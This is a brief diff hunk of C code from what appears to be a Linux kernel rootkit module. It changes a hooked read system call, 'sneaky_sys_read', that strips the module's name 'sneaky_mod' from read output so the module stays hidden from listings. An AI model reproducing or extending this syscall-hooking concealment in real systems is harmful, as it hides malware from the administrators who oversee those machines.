@@ -115,7 +115,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
     void *end = NULL;
     if (originalRes > 0)
     {
-        start = strstr(buf, "sneaky_mod");
+        start = strstr(buf, "sneaky_mod ");
         if (start != NULL)
         {
             end = strstr(start, "\n");
